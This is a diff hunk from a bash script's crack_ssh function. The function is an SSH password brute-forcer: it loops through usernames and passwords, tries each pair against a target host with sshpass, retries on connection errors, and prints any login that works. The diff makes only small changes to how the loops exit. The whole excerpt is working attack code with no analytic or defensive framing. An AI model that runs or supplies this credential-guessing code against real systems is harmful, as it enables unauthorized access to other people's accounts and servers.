@@ -111,12 +111,12 @@ function crack_ssh {
    sleep "$speed"
    if [[ $verbose == 1 ]]; then echo Trying username $users and password $passwd; else echo 0 > /dev/null; fi
    response=$(sshpass -p "$passwd" ssh -q -o connecttimeout=5 -p $port $users@$ip echo 0 2>&1)
-   [ $? == 0 ] && echo Found login for $ip  Username:$users Password:$passwd 
-   if [[ $continue != 1 && $? == 0 ]]; then break 2; fi
+   [ $? == 0 ] && echo Found login for $ip  Username:$users Password:$passwd
+   if [[ $continue != 1 && $? == 0 ]]; then break; fi
    while [ $? == 255 ] || [ $? == 3 ]; do
    response=$(sshpass -p "$passwd" ssh -q -o connecttimeout=5 -p $port $users@$ip echo 0 2>&1)
    [ $? == 0 ] && echo Found login for $ip  Username:$users Password:$passwd
-   if [[ $continue != 1 && $? == 0 ]]; then break 2; fi
+   if [[ $continue != 1 && $? == 0 ]]; then break; fi
    done
    done
    done
